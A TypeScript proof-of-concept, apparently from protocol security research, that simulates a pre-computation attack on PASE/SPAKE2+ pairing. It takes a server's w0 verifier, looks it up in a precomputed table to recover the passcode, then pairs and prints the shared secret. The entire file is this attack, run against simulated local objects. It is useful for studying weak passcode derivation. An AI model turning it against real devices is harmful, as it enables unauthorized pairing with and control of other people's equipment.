import { createReadStream } from 'fs';
import { createInterface } from 'readline';
import { PaseClient } from './PaseClient';
import { PaseServer } from './PaseServer';
import { PbkdfParameters } from "../../crypto/Spake2p";
import { ByteArray } from "../../util/ByteArray";
import { Crypto } from "../../crypto/Crypto";
import { CryptoNode } from "../../crypto/CryptoNode";
import { FORBIDDEN_PASSCODES } from './forbiddenPasscodes';


// initializing the cryptographic provider
const TheCrypto = new CryptoNode();
Crypto.get = () => TheCrypto;

// function to look up the stolen w0 in the CSV file
async function findPasscodeByW0(w0: bigint, filePath: string): Promise<string | null> {
    return new Promise((resolve, reject) => {
        const fileStream = createReadStream(filePath);
        const rl = createInterface({
            input: fileStream,
            crlfDelay: Infinity,
        });

        let isFirstLine = true;  // flag to skip the header

        rl.on('line', (line) => {
            if (isFirstLine) {
                isFirstLine = false; // skip the header line
                return;
            }

            const [passcode, w0Str, w1] = line.split(',');
            if (w0Str && (BigInt(w0Str) === w0)) {
                resolve(passcode); // resolving with the passcode if w0 matches
                rl.close();
            }
        });

        rl.on('close', () => resolve(null)); // resolving with null if no match is found
        rl.on('error', (err) => reject(err)); // rejecting on error
    });
}


// performing pre-computation attack
async function preComputationAttack() {

    // initializing PBKDF parameters
    const pbkdfParameters: PbkdfParameters = {
        iterations: 1000,
        salt: ByteArray.fromString('cosic'), // using a predefined salt 'asalt'
    };

    // simulating server with a random passcode (which is not allowed to be in FORBIDDEN_PASSCODES)
    let serverPasscode: number;
    do {
        serverPasscode = Math.floor(Math.random() * 99999998) + 1;
    } while (FORBIDDEN_PASSCODES.includes(serverPasscode));

    const server = new PaseServer(serverPasscode, pbkdfParameters);
    const client = new PaseClient();

    // simulating stealing w0 from the server
    const stolenW0 = await server.stealw0();

    console.log("running...")

    // looking up the stolen w0 in the precomputed table CSV
    const passcode = await findPasscodeByW0(stolenW0, 'table.csv');

    if (passcode) {
        try {
            // attempting pairing with the retrieved passcode
            const sharedSecret = await client.initiatePairing(Number(passcode), pbkdfParameters, server);
            console.log(`Pairing succeeded with Passcode: ${passcode}`);
            console.log('Shared Secret:', sharedSecret);
        } catch (error) {
            console.error(`Pairing failed with Passcode: ${passcode}`, error);
        }
    } else {
        console.log('Stolen w0 not found in precomputed table.');
    }
}

// running the pre-computation attack
preComputationAttack();
